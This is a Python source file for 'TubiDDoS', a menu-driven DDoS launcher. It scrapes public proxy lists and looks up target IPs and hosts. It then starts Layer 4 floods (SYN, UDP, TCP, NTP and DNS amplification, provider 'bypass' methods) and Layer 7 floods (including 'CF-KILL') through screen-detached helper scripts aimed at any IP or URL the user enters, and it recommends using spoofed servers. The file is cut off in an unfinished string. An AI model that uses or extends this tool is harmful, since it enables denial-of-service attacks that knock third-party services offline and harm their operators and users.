#!/usr/bin/env python3

# DEVELOPED BY PHAN ANH TUẤN

from utils.banner import Count, Bot, AttackSentL4, AttackSentVIPL4, AttackSentL7
from utils.banner import HomeMenu, Proxy, WebTools, MenuL4, MenuL7
from utils.animation.rocket import Rocket
from requests.structures import CaseInsensitiveDict
from urllib.parse import urlparse
#from contextlib import suppress
from subprocess import run
from shutil import which
import os, sys, time, json, random
try:
	import speedtest, colorama, requests, httpx
except Exception as e:	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET

def clear():
	if os.name=='nt':os.system('cls')
	else:os.system('clear')
clear()

class UrlParserProMaxXD:
	def parser(url) -> dict:
		url_d = CaseInsensitiveDict()
		# soon

class Home:
	def __init__(self,
	help: str,
	dev: str):
		self._help = help
		self._dev = dev

	def getproxies(self):
#		status.Style(obj="\n [*] Downloading Proxy...\n")
		file_name = "utils/http.txt"
		http_proxies = [
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&ssl=yes",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"]
		with open(file_name, 'w'):
			for proxies in http_proxies:
				try:
					if httpx.get(proxies).status_code == 200:
						print(Color.LG+f"[{200}] OK -> {proxies}")
						with open(file_name, 'a') as p:
							p.write(httpx.get(proxies).text)
					else:
						print(Color.LR+f"[{httpx.get(proxies).status_code}] ERROR -> {proxies}")
				except:
					print(Color.LR+f"[ERROR] -> {proxies}")

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	@property
	def home(self):
		HomeMenu()
		while 1:
			try:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LR+"TubiDDoS"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				option = input()
				if option in ['01', '1']:	status.Clear(); status.p(option)
				elif option in ['02', '2']:	status.Clear(); status.webt()
				elif option in ['03', '3']:	status.Clear(); status.BBoS()
				elif option in ['04', '4']:	status.Clear(); status.spdtst()
				elif option in ['ref', 'REF']:	status.returnH()
				elif option in ['home', 'HOME']:	status.Clear(); status.returnH()
				elif option in ['clear', 'CLEAR']:	status.Clear(); status.returnH()
				elif option in ['help', 'HELP', '?']:	status.Help()
				elif option in ['dev', 'DEV']:	status.Contact()
				elif option in ['exit', 'EXIT']:	status.Exit(obj=None)
				elif option in ['stop', 'STOP']:	status.Stop()
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:	status.Clear(); status.BBoS()
				elif option == "":	pass
				else:	status.cmdNotFound(option)
			except KeyboardInterrupt:	status.Exit(obj=None)


class Tool(Home):
	def __init__(self,
	help: str,
	dev: str):
		super().__init__(help, dev)

	def proxy(self, new):
		with open("utils/url.json", 'r') as p:	readjson = json.loads(p.read())
		if new in ['ref', 'REF', 'clear', 'CLEAR']:
			status.Clear()
			status.Style(obj="[*] Downloading New Proxy...")
		else:	status.Style(obj="[*] Downloading All Proxy...")
		try:
			for proxy in readjson['Proxies']:
				if proxy['type'] == 1:
					if requests.get(proxy["url"]).status_code == 200:
						http = requests.get(proxy["url"]).text
				if proxy['type'] == 2:
					if requests.get(proxy["url"]).status_code == 200:
						https = requests.get(proxy["url"]).text
				if proxy['type'] == 3:
					if requests.get(proxy["url"]).status_code == 200:
						socks4 = requests.get(proxy["url"]).text
				if proxy['type'] == 4:
					if requests.get(proxy["url"]).status_code == 200:
						socks5 = requests.get(proxy["url"]).text
		except requests.exceptions.ConnectionError:
			status.Exit(obj=Color.LR+"\nError: Check your Internet Connection.")
		status.Clear(); Proxy()
		while 1:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LR+"TubiDDoS"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				option = input()
				if option in ['01', '1']:
					with open("http.txt", 'w') as p:	p.write(http)
					print(Color.LG+"[+]"+Color.LC+" HTTP Saved to http.txt")
				elif option in ['02', '2']:
					with open("https.txt", 'w') as p:	p.write(https)
					print(Color.LG+"[+]"+Color.LC+" HTTPS to https.txt")
				elif option in ['03', '3']:
					with open("socks4.txt", 'w') as p:	p.write(socks4)
					print(Color.LG+"[+]"+Color.LC+" SOCKS4 Saved to socks4.txt")
				elif option in ['04', '4']:
					with open("socks5.txt", 'w') as p:	p.write(socks5)
					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Saved to socks5.txt")
				elif option in ['ref', 'REF']:	status.p(option)
				elif option in ['home', 'HOME']:	status.Clear(); status.returnH()
				elif option in ['clear', 'CLEAR']:	status.Clear(); status.p(option)
				elif option in ['help', 'HELP', '?']:	status.Help()
				elif option in ['dev', 'DEV']:	status.Contact()
				elif option in ['exit', 'EXIT']:	status.Exit()
				elif option in ['stop', 'STOP']:	status.Stop()
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:	status.Clear(); status.BBoS()
				elif option == "":	pass
				else:	status.cmdNotFound(option)

	def webtools(self):
		WebTools()
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LR+"TubiDDoS"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				while True:
					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = urlparse(lookup)
					host = parser.netloc
					if parser.scheme == 'https' or parser.scheme == 'http':
						host = parser.netloc
					elif parser.scheme == '':
						url = "http://"+parser.path
						parser = urlparse(url)
						host = parser.netloc
					print(response_url().lookup(host))
					break
			elif option in ['02', '2']:
				while True:
					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
					print(response_url().ip_lookup(ip_lookup))
					break
			elif option in ['03', '3']:
				while True:
					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url().http_status(http))
					break
			elif option in ['04', '4']:
				while True:
					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = urlparse(findhost)
					host = parser.netloc
					path = parser.path.replace("/", "")
					if parser.scheme == 'https' or parser.scheme == 'http':
						print(response_url().findhost(host))
					elif host == '':
						print(response_url().findhost(path))
					break
			elif option in ['ref', 'REF']:
				self.webtools()
			elif option in ['home', 'HOME']:	status.Clear(); status.returnH()
			elif option in ['clear', 'CLEAR']:	status.Clear(); status.webt()
			elif option in ['help', 'HELP', '?']:	status.Help()
			elif option in ['dev', 'DEV']:	status.Contact()
			elif option in ['exit', 'EXIT']:	status.Exit(obj=None)
			elif option in ['stop', 'STOP']:	status.Stop()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:	status.Clear(); status.BBoS()
			elif option == "":	pass
			else:	status.cmdNotFound(option)

	def spdtest(self):
		print(f"""{Color.LG}

   __                     _ _____          _
  / _\_ __   ___  ___  __| /__   \___  ___| |_
  \ \| '_ \ / _ \/ _ \/ _` | / /\/ _ \/ __| __|
  _\ \ |_) |  __/  __/ (_| |/ / |  __/\__ \ |_
  \__/ .__/ \___|\___|\__,_|\/   \___||___/\__|
     |_|


""")
		try:
			spdt = speedtest.Speedtest()
			print(Color.LC+"[*] Loading Server List...")
			spdt.get_servers()
			time.sleep(0.1)
			print(Color.LC+"[*] Choosing Best Server...")
			get = spdt.get_best_server()
			time.sleep(0.1)
			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
			time.sleep(0.1)
			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")
			print(Color.LC+"\n[*] Performing Download Test...")
			download_result = spdt.download()
			print(Color.LC+"[*] Performing Upload Test...")
			upload_result = spdt.upload()
			ping_result = spdt.results.ping
			time.sleep(0.1)
			print(Color.LC+"\nResults:\n")
			time.sleep(0.1)
			print(Color.LC+"[+] Download Speed:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Upload Speed:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
			print("\n")
		except Exception:
			print(Color.LR+"Error: Check your Internet Connection.\n\n")
	

	def bbos(self):
		print(Color.LR+"\n\n    [>    "+Color.LG+"Please use spoofed server for the best experience."+Color.LR+"    <]\n\n")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Layer4")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" Layer7")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LR+"TubiDDoS"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:	status.Clear(); status.L4()
			elif option in ['02', '2']:	status.Clear(); status.L7()
			elif option in ['ref', 'REF']:	status.BBoS()
			elif option in ['home', 'HOME']:	status.Clear(); status.returnH()
			elif option in ['clear', 'CLEAR']:	status.Clear(); status.BBoS()
			elif option in ['help', 'HELP', '?']:	status.Help()
			elif option in ['dev', 'Dev']:	status.Contact()
			elif option in ['exit', 'EXIT']:	status.Exit(obj=None)
			elif option in ['stop', 'STOP']:	status.Stop()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:	status.Clear(); status.BBoS()
			elif option == "":	pass
			else:	status.cmdNotFound(option)

	def l4(self):
		MenuL4()
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LR+"TubiDDoS"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					Rocket();run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("VSE"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '2']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					Rocket();run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("SYN"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['03', '3']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					Rocket();run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} 1000 {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("TCP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['04', '4']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					Rocket();run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} 1000 {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("UDP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['05', '5']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					Rocket();run([f'screen -dm python3 utils/L4/http {ip} {port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("HTTP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['06', '6']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					Rocket();run([f'screen -dm sudo ./utils/L4/tcp-rape {ip} {port} 2 -1 {floodtime}'], shell=True)
					AttackSentVIPL4(str(ip), int(port), int(2), int(-1), int(floodtime), str("TCP-RAPE"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['07', '7']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					Rocket();run([f'screen -dm sudo ./utils/L4/tcp-bypass {ip} {port} 2 -1 {floodtime}'], shell=True)
					AttackSentVIPL4(str(ip), int(port), int(2), int(-1), int(floodtime), str("TCP-BYPASS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['08', '8']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					Rocket();run([f'screen -dm sudo ./utils/L4/udp-bypass {ip} {port} 2 -1 {floodtime}'], shell=True)
					AttackSentVIPL4(str(ip), int(port), int(2), int(-1), int(floodtime), str("UDP-BYPASS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['09', '9']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					Rocket();run([f'screen -dm sudo ./utils/L4/ovh-bypass {ip} {port} utils/L4/ovh.txt 2 -1 {floodtime}'], shell=True)
					AttackSentVIPL4(str(ip), int(port), int(2), int(-1), int(floodtime), str("OVH-BYPASS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['10']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					Rocket();run([f'screen -dm sudo ./utils/L4/ntp {ip} {port} utils/L4/ntp.txt 2 -1 {floodtime}'], shell=True)
					AttackSentVIPL4(str(ip), int(port), int(2), int(-1), int(floodtime), str("NTP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['11']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					Rocket();run([f'screen -dm sudo ./utils/L4/amp-ntp {ip} {port} utils/L4/ntp.txt 2 -1 {floodtime}'], shell=True)
					AttackSentVIPL4(str(ip), int(port), int(2), int(-1), int(floodtime), str("AMP-NTP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['12']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					Rocket();run([f'screen -dm sudo ./utils/L4/amp-dns {ip} {port} utils/L4/wsd.txt 2 -1 {floodtime}'], shell=True)
					AttackSentVIPL4(str(ip), int(port), int(2), int(-1), int(floodtime), str("AMP-DNS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['ref', 'REF']:	status.L4()
			elif option in ['home', 'HOME']:	status.Clear(); status.returnH()
			elif option in ['clear', 'CLEAR']:	status.Clear(); status.L4()
			elif option in ['help', 'HELP', '?']:	status.Help()
			elif option in ['dev', 'DEV']:	status.Contact()
			elif option in ['exit', 'EXIT']:	status.Exit(obj=None)
			elif option in ['stop', 'STOP']:	status.Stop()
			elif option in ['00', '0']:	status.Clear(); status.BBoS()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:	status.Clear(); status.BBoS()
			elif option == "":	pass
			else:	status.cmdNotFound(option)

	def l7(self):
		MenuL7()
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LR+"TubiDDoS"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put http:// or https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies; Rocket(); run([f'screen -dm node utils/L7/socket1 {url} utils/http.txt {floodtime} 200'], shell=True); run([f'screen -dm node utils/L7/socket2 {url} {floodtime}'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("SOCKET-MIX"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '2']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies; Rocket(); run([f'screen -dm node utils/L7/http1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("TLS-HTTP1"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['03', '3']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies; Rocket(); run([f'screen -dm node utils/L7/http2 {url} {floodtime}'], shell=True);run([f'screen -dm node utils/L7/Thttp2 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("TLS-HTTP2"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['04', '4']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies; Rocket(); run([f'screen -dm node utils/L7/cfkill {url} {floodtime} 1'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("CF-KILL"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['05', '5']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies; Rocket(); run([f'screen -dm node utils/L7/cringeV2 {url} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("CRINGEv2"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['ref', 'REF']:	status.L7()
			elif option in ['home', 'HOME']:	status.Clear(); status.returnH()
			elif option in ['clear', 'CLEAR']:	status.Clear(); status.L7()
			elif option in ['help', 'HELP', '?']:	status.Help()
			elif option in ['dev', 'DEV']:	status.Contact()
			elif option in ['exit', 'EXIT']:	status.Exit(obj=None)
			elif option in ['stop', 'STOP']:	status.Stop()
			elif option in ['00', '0']:	status.Clear(); status.BBoS()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:	status.Clear; status.BBoS()
			elif option == "":	pass
			else:	status.cmdNotFound(option)


class response_url:
	def lookup(self, url):
		try:
			if url == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query").json()
			if resp['status'] == 'success':	return Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']
			else:	return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
		except requests.exceptions.ConnectionError:	return Color.LR+"Error: Check your Internet Connection."

	def ip_lookup(self, ip):
		try:
			if ip == '':	return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname").json()
			if resp['status'] == 'success':	return Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])
			else:	return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except KeyError:	return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except requests.exceptions.ConnectionError:	return Color.LR+"Error: Check your Internet Connection."

	def http_status(self, url):
		try:
			if urlparse(url).scheme == "":
				url = "http://"+url
			resp = httpx.get(url)
			if resp.status_code == 200:	return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (OK)"
			elif resp.status_code == 301:	return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Moved Permanently)"
			elif resp.status_code == 302:	return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Found)"
			elif resp.status_code == 303:	return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (See Other)"
			elif resp.status_code == 307:	return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Temporary Redirect)"
			elif resp.status_code == 400:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Unauthorized)"
			elif resp.status_code == 410:	return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gone)"
			elif resp.status_code == 401:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Requests)"
			elif resp.status_code == 403:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Forbidden)"
			elif resp.status_code == 404:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Not Found)"
			elif resp.status_code == 429:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (To Many Requests)"
			elif resp.status_code == 500:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Internal Server Error)"
			elif resp.status_code == 502:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Gateway)"
			elif resp.status_code == 503:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Service Unavailable)"
			elif resp.status_code == 504:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gateway Timeout)"
			elif resp.status_code == 507:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Insufficient Storage)"
			elif resp.status_code == 508:	return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Loop Detected)"
			else:	return Color.LR+f"    [+] Result: (Connection timeout)"

		except httpx.TimeoutException:	return Color.LR+f"     [+] Result: (Connection timeout)"
		except httpx.ConnectError:	return Color.LR+f"    [+] Result: Error occurred"
		except httpx.UnsupportedProtocol:	return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
		except:	return Color.LR+f"    [+] Result: Error occurred"

	def findhost(self, host):
		try:
			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}")

			if resp.text == 'error invalid host':	return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			else:	return Color.LG+resp.text
		except requests.exceptions.ConnectionError:	return Color.LR+"Error: Check your Internet Connection."


class status:
	@staticmethod
	def p(obj):
		F_Tool.proxy(obj)

	@staticmethod
	def webt():
		F_Tool.webtools()

	@staticmethod
	def spdtst():
		F_Tool.spdtest()

	@staticmethod
	def BBoS():
		F_Tool.bbos()

	@staticmethod
	def L4():
		F_Tool.l4()

	@staticmethod
	def L7():
		F_Tool.l7()

	@staticmethod
	def returnH():
		print(F_Home.home)

	@staticmethod
	def Help():
		print(F_Home._help)

	@staticmethod
	def cmdNotFound(obj):
		print(f"{Color.LR} Command: {Color.LC}{obj}{Color.LR} Not Found")
		print(f"{Color.LC} Type {Color.LB}'help'{Color.LC} For Help")

	@staticmethod
	def Style(obj):
		F_Home.styleText(obj)

	@staticmethod
	def Contact():
		print(F_Home._dev)
	
	@staticmethod
	def Stop():
		run(['pkill screen'], shell=True)
		print(f"{Color.LG} [!] Attack Stopped!")

	@staticmethod
	def Clear():
		print("\033c")

	@staticmethod
	def Exit(obj):
		exit(obj)


def main():
	#  checking if you're gay 😏
	status.Style(obj="[TubiDepZai] Vui Lòng Đợi...\n")
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		clear()
		if ur_mom == None:
			status.Style(obj=f"[!] {pkg} is not installed!\n")
			install = False
		else:	pass
	if install == False:	status.Exit(obj=f'\n[?] Error? try:{Color.LG} sh install.sh')
	else:	pass
	try:
		script = True
		with open('utils'):	pass
	except IsADirectoryError:	pass
	except FileNotFoundError:
		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
		status.Style(obj="\n[+] Please contact TG: @FDc0d3\n")
		os.remove(f'{__file__}')
		script = False
	if script == False:	status.Exit(obj=None)
	else:	Bot();	status.returnH()

if __name__ == '__main__':
	commands = f"""{Color.LC}HOME{Color.LR} -> {Color.LY}Back To Home
{Color.LC}REF{Color.LR} -> {Color.LY}Refresh The Menu
{Color.LC}CLEAR{Color.LR} -> {Color.LY}Clear Screen
{Color.LC}EXIT{Color.LR} -> {Color.LY}Exit The Program

